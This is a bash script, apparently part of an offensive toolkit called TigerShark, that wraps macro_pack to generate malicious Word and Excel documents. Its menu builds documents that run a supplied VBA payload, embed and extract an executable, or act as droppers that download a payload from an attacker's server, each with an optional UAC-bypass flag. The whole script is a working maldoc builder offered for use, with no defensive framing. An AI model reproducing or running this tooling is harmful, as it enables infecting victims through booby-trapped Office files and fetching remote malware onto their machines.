#!/bin/bash
# This script is not used within TigerShark
# TigerShark was made to run on a linux system
# This script however, to utilize its full potential, needs to be used
# on a windows machine with Microsoft Office 16 installed
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
LBBLUE='\e[104m'

vba_doc(){
	echo -e "${W}Please enter the full/path/to/.vba payload${NC}"
	read MALPATH
	echo -e "${W}Would you like to create a docm or xlsm payload?${YLW}(d/x)${NC}"
	read PFILE
	if [[ ${PFILE} == "d" ]]; then
		EXT='docm'
	else
		EXT='xlsm'
	fi
	echo -e "${W}Please enter the name of your malicious document${NC}"
	read NAME
	echo -e "${W}Would you like to add UAC Bypassing?${LP}(y/n)${NC}"
	echo -e "${RED}NOTE:${YLW} This will ask the user to run the payload with admin privileges${NC}"
	read UACQ
	if [[ ${UACQ} == "y" ]]; then
		UAC='--uac-bypass'
	else
		UAC=''
	fi
	wine macro_pack.exe -t DROPPER2 -f ${MALPATH} ${UAC} -o -G ${NAME}.${EXT}
	mv ${NAME}.${EXT} -t /home/$USER/Desktop
	echo -e "${RED}${NAME}.${EXT}${W} has been moved to /home/$USER/Desktop${NC}"
}
embedded(){
	echo -e "${W}Please enter the full/path/to/embedded_file${NC}"
	read LPATH
	echo -e "${W}Please enter the full/patha/payload should be extracted to${NC}"
	read DPATH
	echo -e "${W}Please enter the filename for your payload${NC}"
	read NAME
	echo -e "${W}Would you like to create a doc or xls payload?${YLW}(d/x)${NC}"
	read PFILE
	if [[ ${PFILE} == "d" ]]; then
		EXT='doc'
	else
		EXT='xls'
	fi
	echo -e "${W}Would you like to add UAC Bypassing?${LP}(y/n)${NC}"
	echo -e "${RED}NOTE:${YLW} This will ask the user to run the payload with admin privileges${NC}"
	read UACQ
	if [[ ${UACQ} == "y" ]]; then
		UAC='--uac-bypass'
	else
		UAC=''
	fi
	echo "${DPATH}" | wine macro_pack.exe -t EMBED_EXE --embed=${LPATH} ${UAC} -o -G ${NAME}.${EXT}
	mv ${NAME}.${EXT} -t /home/$USER/Desktop
	echo -e "${RED}${NAME}.${EXT}${W} has been moved to /home/$USER/Desktop${NC}"
}
vdrop(){
	echo -e "${YLW}This creates a malicious Word (.doc) Document that downloads payload from attacker server${NC}"
	sleep 1
	echo -e "${W}Please enter your payload URL with webmask${NC}"
	read PAYURL
	echo -e "${W}Please enter the name for your dropper payload${NC}"
	read PAYNAME
	echo -e "${W}Would you like to create a doc or xls payload?${YLW}(d/x)${NC}"
	read PFILE
	if [[ ${PFILE} == "d" ]]; then
		EXT='doc'
	else
		EXT='xls'
	fi
	echo -e "${W}Please enter the filename for your malicious document${NC}"
	read NAME
	echo -e "${W}Would you like to add UAC Bypassing?${LP}(y/n)${NC}"
	echo -e "${RED}NOTE:${YLW} This will ask the user to run the payload with admin privileges${NC}"
	read UACQ
	if [[ ${UACQ} == "y" ]]; then
		UAC='--uac-bypass'
	else
		UAC=''
	fi
	echo ${PAYURL} "${PAYNAME}" | wine macro_pack.exe -t DROPPER ${UAC} -o -G ${NAME}.${EXT}
	mv ${NAME}.${EXT} -t /home/$USER/Desktop
	echo -e "${RED}${NAME}.${EXT}${W} has been moved to /home/$USER/Desktop${NC}"
}


echo -e "${RED}"
figlet Macros
echo -e "${NC}"
cd tools/macro_pack/bin
echo -e "${ORNG}"
	PS3='What type of macro payload would you like to create?'
    options=("Existing VB payload" "Embedded EXE" "D'n'E Macro" "Back") 
		select opt in "${options[@]}"
			do
				case $opt in
					"Existing VB payload")
						vba_doc
						;;

					"Embedded EXE")
						embedded
						;;
					
					"D'n'E Macro")
						vdrop
						;;

					"Back")
						./tigershark
						;;
				esac
			done
	echo -e "${NC}"
cd /opt/TigerShark 
./tigershark
